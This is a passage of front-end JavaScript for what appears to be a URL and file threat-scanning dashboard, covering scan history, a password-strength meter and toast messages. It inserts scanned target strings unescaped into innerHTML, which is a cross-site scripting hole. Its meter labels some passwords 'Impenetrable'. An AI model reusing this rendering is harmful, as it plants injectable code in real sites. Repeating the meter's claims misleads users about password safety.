    if (sessionScans.length > 25) sessionScans.pop();
    sessionStorage.setItem(SESSION_STORAGE_KEY, JSON.stringify(sessionScans));
  } catch (e) {
    console.warn('Session storage operation failed:', e);
  }
}

function setupSessionHistory() {
  const clearBtn = document.getElementById('clear-session-btn');
  clearBtn?.addEventListener('click', () => {
    AudioFX.click();
    sessionStorage.removeItem(SESSION_STORAGE_KEY);
    renderSessionHistory();
    showToast('Current session scan history cleared.', 'info');
  });
  renderSessionHistory();
}

function renderSessionHistory() {
  const container = document.getElementById('session-history-list');
  const countBadge = document.getElementById('session-count-badge');
  if (!container) return;

  let sessionScans = [];
  try {
    sessionScans = JSON.parse(sessionStorage.getItem(SESSION_STORAGE_KEY) || '[]');
  } catch (e) {
    sessionScans = [];
  }

  if (countBadge) {
    countBadge.textContent = `${sessionScans.length} Scans`;
  }

  if (sessionScans.length === 0) {
    container.innerHTML = `
      <div class="p-10 text-center text-xs text-slate-500 font-mono-code space-y-3">
        <div class="w-12 h-12 rounded-xl bg-slate-900 border border-slate-800 flex items-center justify-center mx-auto text-slate-600 text-xl">
          <i class="fa-solid fa-clock-rotate-left"></i>
        </div>
        <p>No scans performed in this current session yet.</p>
        <div>
          <a href="/dashboard" class="btn-cyber-primary px-4 py-2 rounded-lg text-xs font-bold inline-flex items-center gap-2">
            <i class="fa-solid fa-crosshairs"></i> Run a Scan Now
          </a>
        </div>
      </div>
    `;
    return;
  }

  container.innerHTML = '';
  sessionScans.forEach(item => {
    let statusClass = 'text-emerald-400 bg-emerald-950/50 border-emerald-500/30';
    let icon = 'fa-shield-check';
    if (item.status === 'MALICIOUS') {
      statusClass = 'text-red-400 bg-red-950/50 border-red-500/30';
      icon = 'fa-triangle-exclamation';
    } else if (item.status === 'SUSPICIOUS') {
      statusClass = 'text-amber-400 bg-amber-950/50 border-amber-500/30';
      icon = 'fa-circle-exclamation';
    }

    const typeIcon = item.targetType === 'url' ? 'fa-globe' : 'fa-file-shield';
    const reScanLink = item.targetType === 'url' ? `/dashboard?url=${encodeURIComponent(item.target)}` : '/dashboard';

    container.innerHTML += `
      <div class="p-3.5 sm:p-4 bg-slate-900/60 border border-slate-800/80 rounded-xl hover:border-cyan-500/40 transition flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-xs">
        <div class="flex items-center gap-3 overflow-hidden min-w-0">
          <span class="p-2 sm:p-2.5 rounded-lg bg-slate-800 text-cyan-400 flex-shrink-0">
            <i class="fa-solid ${typeIcon}"></i>
          </span>
          <div class="overflow-hidden min-w-0">
            <p class="font-mono-code font-bold text-slate-100 truncate break-all max-w-full sm:max-w-md" title="${item.target}">${item.target}</p>
            <p class="text-[10px] sm:text-[11px] text-slate-500 truncate">Evaluated at ${item.timestamp} • Threat Index: <span class="font-bold text-slate-300">${item.threatScore}/100</span></p>
          </div>
        </div>
        <div class="flex items-center justify-between sm:justify-end gap-2.5 w-full sm:w-auto pt-2 sm:pt-0 border-t border-slate-800/50 sm:border-0 flex-shrink-0">
          <span class="px-2.5 py-1 rounded text-[10px] sm:text-[11px] font-bold border ${statusClass} flex items-center gap-1">
            <i class="fa-solid ${icon}"></i> <span>${item.status}</span>
          </span>
          <a href="${reScanLink}" class="px-3.5 py-1.5 rounded-lg bg-slate-800 hover:bg-cyan-950 border border-slate-700 hover:border-cyan-400 text-slate-300 hover:text-cyan-300 text-xs transition flex items-center gap-1.5 min-h-[38px]" title="Re-evaluate target">
            <i class="fa-solid fa-arrows-rotate text-[11px]"></i>
            <span>Re-Scan</span>
          </a>
        </div>
      </div>
    `;
  });
}

// User-Friendly Password Strength Checker
function setupPasswordStrengthTester() {
  const input = document.getElementById('pwd-input');
  const bar = document.getElementById('pwd-strength-bar');
  const text = document.getElementById('pwd-strength-text');
  const toggleBtn = document.getElementById('pwd-toggle-visibility');
  const entropyEl = document.getElementById('pwd-entropy-bits');
  const crackTimeEl = document.getElementById('pwd-crack-time');

  // Requirement indicators
  const chkLen = document.getElementById('chk-len');
  const chkMix = document.getElementById('chk-mix');
  const chkNum = document.getElementById('chk-num');
  const chkSym = document.getElementById('chk-sym');

  if (!input) return;

  // Password visibility toggle
  if (toggleBtn) {
    toggleBtn.addEventListener('click', () => {
      const isPassword = input.type === 'password';
      input.type = isPassword ? 'text' : 'password';
      const icon = toggleBtn.querySelector('i');
      if (icon) {
        icon.className = isPassword ? 'fa-solid fa-eye-slash text-cyan-400' : 'fa-solid fa-eye';
      }
    });
  }

  input.addEventListener('input', () => {
    const pwd = input.value;

    const hasLen = pwd.length >= 10;
    const hasMix = /[a-z]/.test(pwd) && /[A-Z]/.test(pwd);
    const hasNum = /[0-9]/.test(pwd);
    const hasSym = /[^a-zA-Z0-9]/.test(pwd);

    // Update requirement badges if present
    const updateChip = (el, valid) => {
      if (!el) return;
      if (valid) {
        el.className = 'px-2 py-0.5 rounded text-emerald-400 bg-emerald-950/40 border border-emerald-500/40 transition-colors';
        el.innerHTML = '<i class="fa-solid fa-check mr-1 text-[10px]"></i>' + el.textContent.trim().replace(/^.*?\s/, '');
      } else {
        el.className = 'px-2 py-0.5 rounded text-slate-500 bg-slate-800/40 border border-slate-700/50 transition-colors';
        el.innerHTML = '<i class="fa-solid fa-circle-dot mr-1 text-[10px]"></i>' + el.textContent.trim().replace(/^.*?\s/, '');
      }
    };

    updateChip(chkLen, hasLen);
    updateChip(chkMix, hasMix);
    updateChip(chkNum, hasNum);
    updateChip(chkSym, hasSym);

    if (!pwd) {
      if (bar) {
        bar.style.width = '0%';
        bar.className = 'h-full bg-slate-700 transition-all duration-300';
      }
      if (text) {
        text.textContent = 'Awaiting your password...';
        text.className = 'text-xs text-slate-400 font-medium';
      }
      if (entropyEl) entropyEl.textContent = '0 bits';
      if (crackTimeEl) crackTimeEl.textContent = 'Instant';
      return;
    }

    // Calculate score (0 to 4)
    let score = 0;
    if (pwd.length >= 6) score++;
    if (pwd.length >= 10) score++;
    if (hasMix) score++;
    if (hasNum || hasSym) score++;
    if (pwd.length >= 14 && (hasNum && hasSym)) score++;

    // Fallback entropy if legacy elements exist
    let pool = 0;
    if (/[a-z]/.test(pwd)) pool += 26;
    if (/[A-Z]/.test(pwd)) pool += 26;
    if (/[0-9]/.test(pwd)) pool += 10;
    if (/[^a-zA-Z0-9]/.test(pwd)) pool += 33;
    const entropy = Math.round(pwd.length * (pool > 0 ? Math.log2(pool) : 0));
    if (entropyEl) entropyEl.textContent = `${entropy} bits`;
    if (crackTimeEl) {
      const combinations = Math.pow(pool, pwd.length);
      const seconds = combinations / (1e11 * 2);
      crackTimeEl.textContent = formatCrackTime(seconds);
    }

    if (pwd.length < 6 || score <= 1) {
      if (bar) {
        bar.style.width = '25%';
        bar.className = 'h-full bg-red-500 transition-all duration-300';
      }
      if (text) {
        text.textContent = 'Weak (Easy to guess or too short)';
        text.className = 'text-xs text-red-400 font-bold';
      }
    } else if (score === 2 || (pwd.length < 10 && !hasSym)) {
      if (bar) {
        bar.style.width = '55%';
        bar.className = 'h-full bg-amber-400 transition-all duration-300';
      }
      if (text) {
        text.textContent = 'Medium (Acceptable, can be improved)';
        text.className = 'text-xs text-amber-400 font-bold';
      }
    } else if (score === 3 || score === 4 && pwd.length < 12) {
      if (bar) {
        bar.style.width = '80%';
        bar.className = 'h-full bg-cyan-400 transition-all duration-300';
      }
      if (text) {
        text.textContent = 'Strong (Safe & resilient against attacks)';
        text.className = 'text-xs text-cyan-400 font-bold';
      }
    } else {
      if (bar) {
        bar.style.width = '100%';
        bar.className = 'h-full bg-emerald-400 shadow-[0_0_12px_rgba(52,211,153,0.5)] transition-all duration-300';
      }
      if (text) {
        text.textContent = 'Top-Class / Excellent (Super Secure & Impenetrable)';
        text.className = 'text-xs text-emerald-400 font-bold';
      }
    }
  });
}

function formatCrackTime(seconds) {
  if (seconds < 1) return '< 1 millisecond';
  if (seconds < 60) return `${Math.round(seconds)} seconds`;
  if (seconds < 3600) return `${Math.round(seconds / 60)} minutes`;
  if (seconds < 86400) return `${Math.round(seconds / 3600)} hours`;
  if (seconds < 31536000) return `${Math.round(seconds / 86400)} days`;
  if (seconds < 31536000 * 1000) return `${Math.round(seconds / 31536000)} years`;
  return 'Centuries+';
}

// Copy to Clipboard Utility
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).then(() => {
    AudioFX.click();
    showToast('Hash copied to clipboard!', 'success');
  }).catch(() => {
    showToast('Failed to copy to clipboard.', 'error');
  });
}

// Toast Notification
function showToast(message, type = 'info') {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  let borderClass = 'border-cyan-500 bg-slate-900/95 text-cyan-300';
  let icon = 'fa-info-circle text-cyan-400';

  if (type === 'success') {
    borderClass = 'border-emerald-500 bg-slate-900/95 text-emerald-300';
    icon = 'fa-check-circle text-emerald-400';
  } else if (type === 'warning') {
    borderClass = 'border-amber-500 bg-slate-900/95 text-amber-300';
    icon = 'fa-triangle-exclamation text-amber-400';
  } else if (type === 'error') {
    borderClass = 'border-red-500 bg-slate-900/95 text-red-300';
    icon = 'fa-skull-crossbones text-red-400';
  }

  toast.className = `border px-4 py-3 rounded shadow-2xl flex items-center gap-3 text-xs font-semibold backdrop-blur-md transition-all duration-300 transform translate-y-2 opacity-0 ${borderClass}`;
  toast.innerHTML = `<i class="fa-solid ${icon}"></i> <span>${message}</span>`;

  container.appendChild(toast);
  setTimeout(() => {
    toast.classList.remove('translate-y-2', 'opacity-0');
  }, 10);

  setTimeout(() => {
    toast.classList.add('opacity-0', 'translate-y-2');
    setTimeout(() => toast.remove(), 300);
  }, 3500);
}
